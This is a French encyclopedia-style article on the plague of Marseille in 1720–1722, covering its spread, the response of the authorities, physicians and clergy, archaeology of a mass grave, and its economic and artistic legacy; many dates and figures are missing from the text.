Un mousse tombe malade et meurt le . À partir de ce jour plusieurs portefaix qui ont manipulé les ballots de coton succombent à leur tour. Le bureau de santé s'inquiète très sérieusement et décide de transférer le vaisseau à l'île de Jarre, de faire brûler les hardes des personnes décédées et d’enterrer les cadavres dans de la chaux vive. Mais ces mesures arrivent trop tard, car des tissus sortis en fraude des infirmeries ont déjà transmis la peste dans la ville.
L’épidémie de peste.
Propagation de la peste.
Les dix décès survenus à bord du navire ne présentaient pas apparemment les symptômes caractéristiques de la peste que sont les charbons et les bubons. Ces manifestations évidentes apparaîtront dans la ville lorsque commenceront à s'y répandre les tissus en provenance du "Grand-Saint-Antoine" infestés de puces porteuses du bacille de Yersin.
Légende de la carte.
A- Porte de la Joliette, B- Porte royale ou porte d'Aix, C- Porte Bernard-du-Bois, D- Porte des Chartreux ou des fainéants, E- Porte de Noailles, F- Porte d'Aubagne, G- Porte de Rome, H- Porte de Paradis, I- Porte Notre-Dame-de-la-Garde, J- Porte de Saint-Victor, K- Arsenal des galères, L- Estacade isolant les galères, M- Abbaye Saint-Victor, N- Fort Saint-Nicolas, O- Fort Saint-Jean.
1- Église Saint-Laurent, 2- Cathédrale de la Major, 3- Église des Accoules, 4- Église Saint-Martin, 5- Église Saint-Ferréol, 6- Église des Augustins, 7- La Vieille Charité, 8- Hôpital du Saint-Esprit (Hôtel-Dieu), 9- Couvent des Présentines, 10- Couvent des Récollets, 11- Couvent de la Visitation, 12- Rue Belle-Table, 13- Place du Palais, 14- Rue de l'Échelle, 15- Rue Jean-Galant, 16- Place des Prêcheurs, 17- Rue de l'Oratoire, 18- Rue des Grands-Carmes, 19- Rue des Fabres, 20- Cours Belsunce, 21- Hôtel de ville, 22- Place des Moulins, 23- Place de Lenche, 24- La Canebière, 25- Rue Saint-Ferréol, 26- Rue Paradis, 27- Place du Champ-Major (place Montyon), 28- Chantier de construction.
Les premiers cas.
Le , rue Belle-Table, venelle étroite et sombre des vieux quartiers, une femme, Marie Dauplan, meurt en quelques heures. À ce moment les médecins doutent que ce décès soit vraiment dû à la peste. Il semble en effet qu'un premier foyer pesteux au sein de l’équipage ait été contenu jusqu’au déballage des balles de coton qui allaient répandre les puces porteuses de la maladie.
Le , un tailleur, Michel Cresp, meurt subitement. Le juillet, deux femmes, Eygazière et Tanouse, demeurant rue de l'Échelle, autre quartier déshérité de la ville, meurent l'une d'un charbon (escarre surinfecté à l'endroit de la piqûre de puce, à ne pas confondre avec la maladie du charbon) sur le nez, l'autre avec des bubons, signes évidents de la peste.
À partir du il est évident que la peste est présente ; ce jour-là Charles Peyssonnel et son fils Jean-André Peyssonnel, tous deux médecins, appelés au chevet d'un enfant d'une douzaine d'années rue Jean-Galland, diagnostiquent la peste et avertissent les échevins. Les morts sont enterrés dans de la chaux vive et leurs maisons sont murées. Les échevins espèrent toujours qu’il s’agit d’une contagion limitée. La cargaison du navire est transférée des infirmeries à l'île de Jarre. À partir du le nombre de décès ne fait que croître ; le père Giraud peut écrire que .
Pic de l'épidémie.
Les mesures prises, telles que la combustion de soufre dans les maisons, sont peu efficaces. L'épidémie de peste progresse dans la vieille ville. Les gens aisés quittent Marseille pour se réfugier dans leurs bastides situées dans les environs. Le corps des galères, à la demande du médecin des galères qui affirme qu'il s'agit bien de la peste, se retranche dans l'arsenal qui s'isole de la mer par une estacade faite de poutres flottantes. Les personnes modestes créent un immense campement sur la plaine Saint-Michel (actuellement place Jean-Jaurès). Le le parlement d'Aix fait interdiction aux Marseillais de sortir de leur terroir et aux habitants de la Provence de communiquer avec eux.
À partir du , il meurt plus de cent personnes par jour. Les infirmeries ne peuvent plus recevoir les malades ; les cadavres sont jetés dans les rues. À la mi-août des médecins, François Chicoyneau et Verny, de l'université de Montpellier, viennent à Marseille sur ordre du Régent, conseillé par son premier médecin Pierre Chirac. Émules de l'école de médecine de Salerne, leur diagnostic, s'opposant aux médecins marseillais à la formation scolastique, est évident : c'est la peste.
Fin août, tous les quartiers de Marseille sont touchés, y compris le quartier de Rive-Neuve, séparé de la ville par le port et le vaste arsenal des galères. Malgré les mesures prises par le chevalier Roze qui est alors capitaine de ce quartier, il a été impossible de couper toute communication avec la vieille ville contaminée d'où l’extension de la contagion. Il meurt alors trois cents personnes par jour. Des familles entières disparaissent, aucune rue de la vieille ville n'est épargnée. Les églises ferment leurs portes les unes après les autres : il meurt alors mille personnes par jour.
De nombreuses réglementations sont mises en place par les diverses autorités locales et les parlements. Afin d'harmoniser la réglementation, le Conseil d'État prend le un arrêt qui annule toutes les mesures prises, prononce le blocus de Marseille et règle la police maritime. L'arrêt marque une prise en main affirmée du pouvoir royal et une dépossession des compétences des pouvoirs locaux, à tel point que le parlement d'Aix proteste en refusant d'abord de l'enregistrer. Il est placardé sur toutes les limites qu'il fixe et annonce réserver des sanctions lourdes à qui contreviendrait aux dispositions relatives aux quarantaines et billets de santé (galère pour les hommes et bannissement pour les femmes, mort en cas de récidive). Mais il est déjà trop tard : le bacille s'est répandu dans l'intérieur des terres et il faudra encore deux années de lutte pour éradiquer la peste du Languedoc et de la Provence car c'est le que la dernière quarantaine est ordonnée à Avignon. Un cordon sanitaire est mis en place pour protéger le reste de la France, avec le mur de la peste dans les monts de Vaucluse prolongé jusqu’à la Durance le long du Jabron puis jusqu’aux Alpes.
Extension aux régions voisines.
Marseille n'est pas la seule cité provençale attaquée par l'épidémie qui touche également Arles, Aix-en-Provence et Toulon. Les petites communes situées dans le voisinage de ces grandes villes sont également atteintes par la peste : Allauch, Cassis, Aubagne, Marignane, etc. Seule la commune de La Ciotat, protégée par ses murailles, est épargnée par la peste.
Le Languedoc et le Comtat sont également touchés avec les villes d'Alès et d'Avignon. La ville de Beaucaire est épargnée, probablement grâce à la sage précaution de supprimer la foire traditionnelle.
Le Gévaudan est aussi contaminé avec les villes de Marvejols et de Mende. L'épidémie du Gévaudan ne fait « que » , ce qui représente 41 % de la population des régions touchées. La Canourgue perd 64 % de sa population et Marvejols 53%.
Au total, l'épidémie fait entre et environ (Marseille y compris) sur une population de . Les derniers foyers s'éteignent à la fin de 1722 dans les communes d'Avignon et d'Orange.
L'apaisement.
À partir du mois d' la peste se met à reculer dans Marseille et les personnes atteintes guérissent plus facilement ; la mortalité journalière tombe à une vingtaine de personnes. Cette baisse se poursuit au début de l'année 1721 avec une mortalité journalière de une ou deux personnes. Les boutiques rouvrent, le travail reprend sur le port et la pêche est de nouveau pratiquée. Parmi les différents signes qui marquent ce renouveau de l'activité en 1721, peut être retenue par exemple la reprise le des délibérations de la Chambre de commerce qui les a interrompues depuis le . Le de Belsunce organise une grande procession à l'occasion de la fête du Sacré-Cœur malgré les réticences de Langeron qui craint un retour de la peste.
Description contemporaine.
 Leprince de Beaumont, dans les "Mémoires de madame la baronne de Batteville", décrit les conditions dramatiques dans lesquelles la population de Marseille dut vivre : .
La rechute de 1722.
De nouveaux cas de peste se produisent en . C'est la panique. À la demande de de Belsunce, les échevins font le à la suite de cette rechute le vœu solennel d'aller entendre à chaque date anniversaire la messe au monastère de la Visitation et d'offrir . Ce vœu du ne cesse d'être accompli jusqu'à la Révolution. À partir de 1877, la Chambre de commerce et d'industrie Marseille-Provence reprend le vœu sans qu'il n'y ait plus eu d'interruption jusqu'à nos jours, se chargeant de l'organisation d'une cérémonie religieuse marquée par l'offrande d'un cierge tel que celui décrit en 1722. La cérémonie a lieu dans l'église du Sacré-Cœur du Prado.
Dès le début du mois d', l'épidémie est enrayée, il n'y a plus ni malades ni décès causés par la peste.
Causes de la propagation et type de peste.
L'ignorance au des causes et modes de propagation de la peste est responsable du peu d'efficacité de la médecine de l'époque et des mesures de précautions prises : le bacille responsable de la peste n'a été découvert par Alexandre Yersin qu'en 1894. D'après les descriptions de l'époque, il est possible d'affirmer que la peste de Marseille fut bubonique ou plus exactement bubo-septicémique. En revanche la forme pulmonaire, transmissible par la seule respiration du malade, doit être écartée. Si ce type de peste avait sévi, certains historiens pensent que la maladie aurait pu toucher l'ensemble du pays, et toute l'Europe, avec un nombre de morts considérable. Cette affirmation n'est absolument pas fondée pour d'autres auteurs.
Les rats et les puces d'un animal sont généralement les vecteurs de la maladie. Or, les descriptions de l'époque faites par des contemporains tels que le docteur Bertrand ou Pichatty de Croissainte ne font aucune mention de mortalité de rats. Le vecteur de transmission est cependant bien la puce, mais qui se transmet d'homme à homme ou par l'intermédiaire de leurs vêtements et des étoffes. Certains pensent que le rat a joué un certain rôle dans la transmission de la maladie. À l'époque, seul le rat noir est présent en France ; toutefois, le comportement de ce rongeur est différent de celui du rat gris qui est actuellement très répandu. Le rat noir malade irait mourir dans des lieux écartés, tandis que le rat gris va mourir dans les rues. D'un point de vue strictement entomologique, la puce impliquée ("Xenopsylla cheopis") ne peut généralement pas résister à des températures inférieures à . Après la disparition des vecteurs principaux (rats puis humains les plus exposés), les conditions météorologiques et températures locales à Marseille ont pu être l'un des facteurs aggravants puis réducteurs de la propagation de la peste via les puces depuis fin jusqu'au mois d'octobre de la même année. D'un point de vue météorologique, la moyenne historique des températures diurnes relevées à Marseille s'élève à pour le mois de juin et en septembre alors qu'en octobre, cette valeur tombe à une moyenne de seulement. En revanche, lors des pics de chaleur de juillet à août, ces valeurs moyennes s'élèvent à à Marseille, ce qui favorise la reproduction et l'expansion des puces "Xenopsylla cheopis".
Moyens de lutte.
Les médecins (même les médecins de peste) sont impuissants devant cette épidémie dont ils ne connaissent que les symptômes apparents. Les mesures préventives sont largement traditionnelles, voire superstitieuses, telles que l'utilisation de phylactères.
La maladie étant inconnue, il en résulte une thérapeutique traditionnelle pour l'époque : transpiration, vomissement, purgation et bien sûr et surtout l'inévitable saignée qui n'a d’autre résultat que d'abréger les souffrances du malade. Quant aux pratiques chirurgicales, elles consistent à inciser les bubons lorsqu'ils arrivent à maturité.
Cependant tout n'est pas inutile. L'accoutrement des médecins avec leur tablier de cuir ou de toile cirée diminue les risques de piqûre des puces. Les parfums utilisés pour désinfecter les habitations à base de soufre et d’arsenic peuvent avoir un impact sur la destruction des puces. En revanche le fameux vinaigre des quatre voleurs n'a aucun effet. L’origine de cette potion est la suivante : quatre voleurs sont arrêtés alors qu'ils détroussaient les pestiférés au cours de l'épidémie de Toulouse en 1628-1631. Afin d'avoir la vie sauve, ils révèlent le secret de la composition d'un remède qui leur permettait de se préserver de la contagion. La préparation se faisait à partir d'absinthe, sauge, menthe, romarin, rue, lavande, cannelle, girofle et ail. Malgré la révélation de ce secret les voleurs auraient été pendus. Ce vinaigre antiseptique connut des heures de gloire et ne disparut du Codex qu’en 1884.
En plus des mesures d'isolement de la ville, certaines autorités municipales recoururent à la "serrado" (la resserre), la quarantaine généralisée avec isolement de chaque foyer, dans les cas où l'épidémie s'était déjà introduite dans la cité. Les villes d'Arles et de Toulon connurent ainsi plusieurs séquences de confinement, de même que des communes de moindre taille comme La Valette se virent aussi appliquer ce procédé. Selon l'historien Gilbert Buti, ces quarantaines généralisées ont une « efficacité limitée et inégale » : leur succès est dépendant du rapport entre le moment où le dispositif est déclenché et l'avancement de l'incubation. Ces séquences posent la question du ravitaillement des foyers et mobilisent ainsi des responsables qui, comme les notaires et les religieux, doivent aller de maison en maison en courant des risques importants et en risquant de propager eux-mêmes le mal.
Organisation des secours.
Dans le désarroi général, peu de responsables demeurent à leur poste. Sous l’autorité du viguier, Louis-Alphonse Fortia, marquis de Pilles, les échevins de l’année, Jean-Pierre de Moustiès et Balthazar Dieudé, et ceux de l’année précédente, Jean-Baptiste Estelle et Jean-Baptiste Audimar, se dépensent sans compter et font preuve d’un grand courage. Peu de leurs collaborateurs demeurent en fonction à l'exception de Capus, archivaire secrétaire général de l’hôtel de ville, et Pichatty de Croissainte, procureur du roi. Restent également à leur poste, Jean-Pierre Rigord, subdélégué de l'intendant de Provence, et Jean-Jacques de Gérin, lieutenant de l'amirauté.
Un chef d'escadre, Charles-Claude Andrault de Langeron, arrive à Marseille le revêtu de pouvoirs extraordinaires : il a sous ses ordres tous les fonctionnaires, y compris le viguier et les échevins. D'autres civils apportent leur aide : le peintre Michel Serre ou le docteur Bertrand, qui laissent chacun un témoignage très intéressant sur ce qu'ils ont vu sous la forme de tableaux représentant des scènes de cette épidémie pour l'un et d'un mémoire intitulé "Relation historique de la peste de Marseille en 1720" pour l'autre.
Cardin Lebret collectionne les titres et les fonctions puisqu'il est à la fois intendant de Provence et président du parlement de Provence. Élevé à l'école des grands fonctionnaires qui s'étaient directement inspirés des méthodes de Colbert et de Louvois, il aime avant tout l'ordre ; il est le représentant du roi en Provence et par son activité et sa compétence encourage et stimule les échevins. Mais il ne combat la peste que de loin et réside suivant l’évolution des zones contaminées à Aix-en-Provence, puis Saint-Rémy-de-Provence et Barbentane. C’est dans cette dernière ville qu’il accueille le un groupe de vingt-et-un apprentis chirurgiens et médecins venus de Paris apporter leur aide. Parmi ces volontaires figure Jacques Daviel, qui deviendra maître chirurgien et oculiste du roi. De même, le parlement de Provence suit de loin l’évolution de l’épidémie et devant la propagation se retire à Saint-Rémy de Provence puis à Saint-Michel de Frigolet.
Sous la direction des échevins l’administration municipale assure une triple tâche : le ravitaillement des populations, le maintien de l’ordre et surtout l’enlèvement des cadavres. Les achats de blé sont effectués auprès des particuliers, des consuls de la province et de l’intendant du Languedoc. Le viguier et les échevins sont investis avec l’accord de l’intendant Lebret de pouvoirs extraordinaires et les délits sont réprimés avec sévérité. L’enlèvement des cadavres est la tâche la plus angoissante à cause du manque de main d’œuvre et des risques de contagion.
Un tableau de Dominique Antoine Magaud intitulé "Le Courage civil : la peste de 1720 à Marseille" peint en 1864 et actuellement exposé au musée des Beaux-Arts de Marseille, montre une réunion de travail des principales personnes chargées de l'administration de la ville. Les personnages représentés sont : debout, le chevalier Roze montrant de son bras gauche de Belsunce en arrière-plan ; autour de la table se trouvent les échevins Estelle, Dieudé, Audimar qui tourne le dos, et Moustier ; à la droite du chevalier Roze est représenté le commandant de Langeron s'appuyant sur son coude et semblant plongé dans une profonde méditation. En arrière-plan et à gauche se distinguent le peintre Michel Serre, le père Milley et un capucin.
Évacuation des cadavres.
Dès le début du mois d' les caveaux des églises ou les cimetières ne sont plus autorisés à recevoir les corps des pestiférés qui doivent être emmenés aux infirmeries par les « corbeaux » (croque-morts). À partir du l'ouverture de fosses communes s'impose. Une compagnie de grenadiers enlève de force des paysans dans les campagnes pour creuser à l'extérieur des remparts une quinzaine de fosses.
Le , les civières ne suffisent plus et apparaissent les premiers tombereaux pour l'enlèvement des cadavres. À la mi-août, les infirmeries ne peuvent plus recevoir les malades ou les morts, les cadavres sont laissés dans les rues. Les chariots viennent à manquer ; les échevins font prendre d'autorité des attelages dans les campagnes. Les tombereaux ne pouvant circuler dans les rues étroites du quartier Saint-Jean de la vieille ville, des civières sont confectionnées pour apporter les cadavres jusqu'aux chariots. Pour conduire les chariots et enlever les cadavres, il est alors fait appel aux forçats de l'arsenal des galères, choisis parmi les plus médiocres rameurs. Mais cette main d'œuvre pour le moins indisciplinée nécessite une surveillance étroite. L’échevin Moustier en personne, précédé et suivi de quatre soldats baïonnette au canon, conduira lui-même chaque jour un détachement de forçats.
Si les échevins arrivent à nettoyer la ville d'une grande partie des cadavres, le quartier de la Tourette n'est pas dégagé. Ce quartier habité par des familles de marins et situé à proximité de l'église Saint-Laurent a été totalement ravagé par la peste. Seul le chevalier Roze qui s'est distingué dans le nettoiement du quartier de Rive-Neuve, accepte la mission de débarrasser de ses cadavres le quartier de la Tourette. À la tête d'un détachement de cent forçats, il fait jeter dans deux vieux bastions un millier de cadavres qui sont recouverts de chaux vive. C’est l’épisode le plus célèbre de cette lutte contre la peste. Parmi les forçats cinq seulement survécurent.
Paléopathologie.
Charnier de l'Observance.
Tout au long du , plusieurs anciennes fosses communes ont été découvertes au cours de divers travaux d'aménagement. Ces charniers n'ont jamais été jugés dignes d'intérêt archéologique et les restes humains ont été réinhumés ou mis en décharge. C’est pour lutter contre cette destruction régulière d'archive qu'a été entreprise en 1994 la fouille d'une fosse commune découverte à l'angle des rues Jean-François-Leca et de l'Observance.
Cette fosse se trouvait dans les anciens jardins du couvent de l'Observance situé en contrebas de la Vieille Charité. Ce couvent appartenait aux frères mineurs de l'étroite observance, appelés ainsi parce qu'ils observaient à la lettre la règle de saint François. Il fut utilisé comme hôpital lors de l'épidémie de peste et fut ensuite vendu comme bien national à la Révolution.
Près de deux cents squelettes ont été exhumés entre août et et ont fait l'objet d'études anthropologique et biologique. Les archéologues ont constaté que la fosse a été inégalement remplie. Trois zones apparaissent : à l'est une zone à forte densité avec empilement des corps, au centre une zone à faible densité avec individualisation des inhumations et enfin à l'ouest une zone à densité presque nulle. Cette variation traduit les phases de l'épidémie qui va en décroissance rapide. Ce nombre relativement faible des inhumations pousse les archéologues à estimer qu'il s'agit d'une fosse qui aurait fonctionné au cours de la deuxième période de l'épidémie, soit de mai à .
Le décès par peste des individus inhumés dans ce charnier ne fait aucun doute puisque l'ADN du bacille de la peste a été mis en évidence. Les corps étaient systématiquement recouverts de chaux vive. À l'exception d'un corps possédant une boucle de ceinture, il n'y a aucun élément de parure. Des fragments de draps démontrent que les cadavres ont été enterrés nus dans des linceuls. Une épingle en bronze plantée dans la première phalange du gros orteil a souvent été trouvée : il s'agit d'une pratique habituelle à cette époque pour vérifier la mort effective de l'individu. Cette approche multidisciplinaire révéla des faits et des renseignements inconnus auparavant concernant l'épidémie de 1722 tels que la mise en évidence d'un geste anatomique d'ouverture de la boîte crânienne d'un adolescent de quinze ans environ. La restauration de ce crâne en laboratoire a permis de reconstituer la technique d'anatomie utilisée pour cette autopsie, qui semble être identique à celle décrite dans un livre de médecine datant de 1708.
Étude de 2016 de l'Institut Max Planck.
Selon "Sciences et Avenir", une nouvelle étude de l'Institut Max Planck en 2016 révèle que cette épidémie de peste « marseillaise » ne venait pas du Moyen-Orient comme on le pensait, mais était une résurgence de la grande peste noire ayant dévasté l’Europe au . Le bacille "Yersinia pestis" apporté par le navire "Grand-Saint-Antoine", à l’origine de l’épidémie de peste qui a ravagé la Provence entre 1720 et 1722, est donc resté latent quatre siècles. Cette étude suggère ainsi l'existence probable d'un foyer permanent de peste des rongeurs en Europe centrale et de l'est (foyer aujourd'hui disparu) en lien avec ceux du Caucase.
Il existe en effet deux grandes théories sur le déroulement de la deuxième pandémie de peste en Europe (du ) : l'une qui l'explique par des apports répétés d'Asie centrale, l'autre par la persistance de foyers européens ou caucasiens.
Les responsables de l'épidémie et les intervenants.
Durant cette épidémie plusieurs personnes interviennent pour apporter une aide matérielle ou morale à la population particulièrement éprouvée. Les diverses responsabilités relatives à la propagation de la peste sont difficiles à établir avec précision et impartialité.
Personnalités civiles.
Le "Grand-Saint-Antoine" aurait dû effectuer sa quarantaine à l'île de Jarre conformément à une instruction de 1716 et n'aurait jamais dû débarquer directement ses marchandises aux infirmeries car le navire a connu plusieurs décès à bord durant son retour vers Marseille. Pourquoi la réglementation n'a-t-elle pas été respectée et quelles sont les diverses responsabilités ?
À l'époque, la première personne mise en cause est le capitaine Jean-Baptiste Chataud. Il sait très probablement que la peste est à bord de son navire mais il fait une déclaration conforme à la réglementation, sans cacher les décès survenus durant la traversée. Il est cependant écroué le au château d'If et ne sera libéré que le , bien que sa non-culpabilité ait été admise depuis longtemps.
Le deuxième personnage qui fait l'objet de nombreuses controverses est le premier échevin de la ville de Marseille, Jean-Baptiste Estelle, qui est propriétaire d'une partie de la précieuse cargaison. Cette marchandise dont la valeur est estimée entre 300 et appartient pour les deux tiers à un grand nombre de petits propriétaires, le reste, soit le tiers de la valeur, se répartissant à parts égales entre quatre propriétaires dont Estelle. Le premier échevin est donc propriétaire d'une marchandise d'une valeur d'environ , somme certes élevée mais non considérable pour un négociant de cette importance. Estelle est tout d'abord soupçonné de trafic d'influence auprès des intendants de la santé aussi bien pour son propre compte que pour les autres négociants. Grâce au soutien de l'intendant Lebret, il sera reconnu innocent par le roi en 1722 qui lui octroie des lettres de noblesse et lui accorde une rente annuelle de . Estelle ne bénéficie pas longtemps d'une telle faveur car il décède peu après le à l’âge de . La responsabilité éventuelle de certaines personnes dans l'origine de l'épidémie ne doit pas faire oublier le grand dévouement des échevins et celui de leurs collaborateurs.
Les intendants sanitaires ont probablement une lourde responsabilité. En effet ils sont juges et parties : non indépendants par rapport aux négociants et au pouvoir municipal, ils se sont probablement laissés fléchir pour adopter des règles moins rigoureuses pour la mise en quarantaine des marchandises du "Grand-Saint-Antoine". Par ailleurs le laxisme généralisé peut s’expliquer par la non-propagation de maladies contagieuses pendant une soixantaine d'années. Le manque de discipline au sein des infirmeries a entraîné une sortie en fraude de tissus contaminés provenant notamment de diverses pacotilles appartenant à l'équipage. Ce sont très probablement ces tissus sortis en fraude des infirmeries qui ont propagé la peste.
Parmi les personnalités civiles, la figure qui se détache le plus est celle du chevalier Roze qui, nommé capitaine du quartier de Rive-Neuve, organise le ravitaillement et engage tous ses biens pour trouver du blé. L'épisode du nettoiement du quartier de la Tourette est le plus célèbre. La modestie du chevalier Roze l’empêchera de faire valoir ses mérites.
Professionnels de santé.
Chirurgiens.
Depuis le , la ville de Marseille engage un « chirurgien de peste » de façon permanente, recruté parmi les « garçons chirurgiens » (jeune chirurgien en fin de formation). Celui-ci est chargé d'examiner les cas suspects à bord des navires, au sein des lazarets et des hôpitaux. En 1692, la ville se dote de deux chirurgiens de peste. Lorsque la peste se déclare en juillet 1720, les médecins et chirurgiens de Marseille ne peuvent prendre en charge le nombre élevé de malades. Sur les trente chirurgiens restés en place, vingt-cinq perdent la vie.
Le 30 septembre 1720, les échevins de Marseille publient des affiches pour recruter des chirurgiens dans toute la Provence et le Languedoc, recrutement qui s'étend jusqu'à Lyon, Bordeaux et Paris, et à l'étranger (Italie, Allemagne, Espagne, Saint-Domingue). De 1720 à 1722, 178 chirurgiens, 23 médecins et 20 apothicaires arrivent en renfort à Marseille, dont le jeune chirurgien Jacques Daviel.
La corporation des maitres-chirurgiens de Marseille, déjà en conflit avec la municipalité sur le « statut privilégié » du chirurgien de peste, refuse de reconnaitre ces nouveaux membres, car elle entend garder son monopole de contrôle professionnel. La bataille juridique est tranchée le 12 avril 1730 par une ordonnance royale validant les maîtrises de chirurgiens ayant travaillé durant la peste.
La peste de Marseille marque une réorganisation de la profession de chirurgien. Celle-ci est moins régenté par une corporation, mais plutôt par le pouvoir politique urbain et étatique, ce qui favorise l'ascension sociale et professionnelle des jeunes chirurgiens. À la fin du , la corporation des maîtres-chirurgiens de Marseille devient le Collège des chirurgiens de Marseille.
Médecins.
Les médecins sont partagés, en ce qui concerne la peste, entre les « contagionnistes » (transmission directe par contact physique ou indirecte : aérienne rapprochée ou par objets) et les « anticontagionnistes » ou « infectionnistes » (par air infect, « venin aérien » ou miasmes).
Les contagionnistes eux-mêmes se divisent entre ceux qui imaginent un agent pathogène de type venin ou levain sujet à dilution (ce qui explique la fin d'une épidémie), ou de type animalcule microscopique sujet à multiplication (ce qui explique la diffusion explosive d'une épidémie).
La thèse anticontagionniste reste majoritaire à Montpellier et à Paris, avec des figures d'autorité comme Pierre Chirac, premier médecin de Philippe d'Orléans et futur premier médecin de Louis XV, et François Chicoyneau, Chancelier de la faculté de médecine de Montpellier. En soutenant le caractère non contagieux de la peste, Chirac conseille aux Marseillais , la pénétration des miasmes dans le corps étant empêchée par la réplétion et la bonne humeur. Chicoyneau, lui, touche les malades, dissèque les cadavres sans aucune précaution : il a toutefois la chance extraordinaire de ne pas avoir contracté la maladie.
La plupart des médecins marseillais, confrontés à une expérience de terrain, sont contagionnistes comme Charles Peyssonnel ou Jean-Baptiste Bertrand ("Relation historique de tout ce qui s'est passé à Marseille pendant la dernière peste", 1721). Le médecin lyonnais Jean-Baptiste Goiffon relate plus particulièrement l'extension de la peste de Marseille au Gévaudan, et en déduit que la peste se transmet par insectes ailés invisibles.
Parmi les tenants minoritaires de la contagion, on trouve Jean Astruc qui juge que la peste se transmet à partir de la sueur du pestiféré dont la quantité aérienne décroit en fonction du carré de la distance ("Dissertation sur la Contagion de la Peste où l'on prouve que cette maladie est véritablement contagieuse et où l'on répond aux difficultés qu'on oppose contre ce sentiment", 1724). La démonstration d'Astruc est purement livresque, témoignant de son érudition exhaustive. Conformément à sa théorie, il reste éloigné de Marseille, préférant Toulouse à Montpellier (trop proche encore de Marseille) pour se tenir informé.
Un autre auteur remarquable est Antoine Deidier (1670-1746) qui, dans sa "Dissertation où l’on a établi un sentiment particulier sur la contagion de la peste" (1725), présente les observations qu'il a faite à Marseille durant l'épidémie. Deidier veut démontrer que la peste se transmet aussi par contact direct en réalisant une peste expérimentale chez le chien par inoculation de bile obtenue à l'autopsie de pestiférés. Il vérifie la similitude des lésions chez l'homme et l'animal, ce qui ferait de Deidier un précurseur de la médecine expérimentale.
Ecclésiastiques.
La personnalité religieuse la plus connue est l’évêque de Marseille, de Belsunce, qui se signala notamment par son zèle et son dévouement à secourir les malades. Face à cette épidémie sans précédent, il décide de rendre visite aux malades en leur administrant les derniers sacrements. On le vit aussi distribuer d'abondantes aumônes afin de soulager ses ouailles. Sur les conseils d'Anne-Madeleine Rémusat, il décide le de consacrer la ville au Sacré-Cœur de Jésus au cours d'une cérémonie expiatoire sur le cours qui porte aujourd'hui son nom. L'évêque célèbre la messe tête nue, pieds nus et un flambeau à la main.
Le , il organise une procession générale sur les fosses communes situées pour la plupart à l'extérieur des remparts ; la bénédiction est donnée à chacune de ces fosses. Afin d'apporter une aide matérielle aux malades, il aliène une grande partie de son patrimoine.
Sur plus de deux cent cinquante religieux, un cinquième d'entre eux, comme le père jésuite Millet succombent à l'épidémie en soignant et portant secours aux pestiférés. Ces attitudes courageuses ne sont pas généralisées. Ainsi les moines de l'abbaye Saint-Victor se renferment derrière les murailles de leur monastère et se contentent d'envoyer quelques aumônes. De même les chanoines de l'église Saint-Martin, qui sera démolie au pour la réalisation de la rue Colbert, se réfugièrent à la campagne.
Réactions populaires de survie.
Malgré un fort contrôle urbain (isolement, mise en quarantaine, quadrillage urbain, police d'exception…), les Marseillais et Marseillaises ne sont pas restés passifs, écrasés par les évènements ou totalement soumis à la volonté divine. La population résiste au quotidien pour maintenir un lien social.
Les Marseillais tentent de maintenir une distanciation physique en évitant de se toucher ou de respirer le souffle d'autrui, les plus aisés disposent de « bâtons de Saint Roch », sorte de longues cannes qu'ils agitent autour d'eux pour éloigner les autres.
La fermeture des lieux de cultes et la restriction des cortèges religieux entrainent des pratiques de dévotion individuelle comme le port sur soi de prières imprimées.
Les gens s'informent réciproquement de leur santé par relations de voisinage. Des familles séparées par la peste gardent un lien épistolaire. Les missives conservées dans les Archives municipales de Marseille montrent qu'elles servaient entre autres à rassurer, venir en aide (argent et denrées), prodiguer des conseils, régler des successions…
Les rapports entre les bien-portants et les pestiférés ne sont pas tous marqués par la fuite et l'évitement. Des personnes, par solidarité ou charité, prennent soin des malades en dépit du risque encouru, de leur propre chef ou employés par la municipalité. Une centaine d'adolescents servirent comme infirmiers et succombèrent en grand nombre.
Bilan et conséquences économiques.
La ville de Marseille comptait avant la peste, au début de 1720, environ habitants. Le nombre de décès provoqués par cette épidémie varie suivant les estimations. Il se situerait entre morts pour certains, tandis que d'autres retiennent le chiffre de pour la ville et pour la ville et son terroir réunis.
Cette perte de population est rapidement compensée en trois ou quatre ans seulement. Un tel phénomène s'explique par la chute de la mortalité et une poussée importante de la natalité liée à une multiplication de mariages mais aussi et surtout par une immigration en provenance des régions proches (actuel département des Alpes-de-Haute-Provence) ou lointaines (comme la Ligurie, la Suisse ou la Catalogne). L'immigration a réparé la plus grande partie des pertes.
Pour l’économie le coup d’arrêt est brutal car le port est fermé trente mois et les fabriques arrêtées. Mais les conséquences dues uniquement à la peste sont difficilement identifiables car elles s'enchevêtrent avec celles provoquées par l'effondrement du système de Law. Il est cependant évident que la paralysie du port a eu des répercussions multiples sur l'économie. À cela s'ajoute une méfiance des ports envers celui de Marseille qui ne prend fin qu'en 1724, bien après la fin de l'épidémie en 1722.
La peste et ses représentations.
Le souvenir de la peste de 1720, évènement tragique d'une ampleur exceptionnelle, semble toujours présent dans la mémoire collective des Marseillais. Ainsi, jusque dans les années 1940, pour dire "merde", les Marseillais prononçaient parfois le nom de "Moustier". Cela peut expliquer le grand nombre de réalisations de peintures, gravures ou sculptures et de publications d'ouvrages historiques ou romans concernant cette épidémie.
Peintures et gravures.
Une dizaine d'œuvres semblent avoir été réalisées pendant ou peu de temps après l'épidémie : trois toiles de Michel Serre, quatre gravures de Jacques Rigaud, un ex-voto de François Arnaud, une toile de Jean-François de Troy et une esquisse attribuée à Dandré-Bardon. Les toiles de Michel Serre, commissaire courageux du quartier Saint-Ferréol, sont d'autant plus intéressantes qu'il a été un témoin direct de l'évènement. Ces œuvres contemporaines peuvent être classées en deux groupes.
Le premier représente les scènes des rues. Il s'agit de deux toiles imposantes de Michel Serre : "Vue de l'hôtel de ville" () et "Vue du Cours" (actuellement cours Belsunce) (), et de quatre gravures de Rigaud. Les deux toiles de Michel Serre sont achetées par M. de Cannis qui les fait exposer en Angleterre et en Hollande. Elles font partie de la collection attribuée par de Belsunce au collège des Jésuites qui porte son nom. Elles y demeurent jusqu'à la suppression de l'ordre en 1762. Elles sont ensuite acquises par délibération de la ville en date du pour être placée à l'hôtel de ville d'où elles seront transférées en 1804 dans le nouveau musée installé dans l'ancien couvent des Bernardines, actuel lycée Thiers. Elles se trouvent aujourd'hui au musée des Beaux-Arts de Marseille. La toile "Vue de l'Hôtel de ville" est remarquablement rendue depuis les scènes d'enlèvement des cadavres jusqu'au pavillon de l'hôtel de ville et de l'immeuble qui le jouxte avec ses fenêtres à meneaux. Cette toile est parvenue mutilée de sa partie gauche, au couchant de l'hôtel de ville.
